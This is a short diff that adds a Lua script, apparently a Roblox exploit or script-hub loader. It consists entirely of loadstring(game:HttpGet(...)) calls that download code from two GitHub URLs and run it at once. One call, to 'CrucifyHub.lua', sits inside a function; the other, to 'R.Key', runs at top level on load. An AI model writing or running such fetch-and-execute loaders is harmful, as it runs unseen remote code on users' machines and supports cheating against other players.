@@ -1,0 +1,5 @@
+function execute()
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/shroomsss/main/main/CrucifyHub.lua"))()
+end
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/MadGics/Scripty/main/R.Key")()
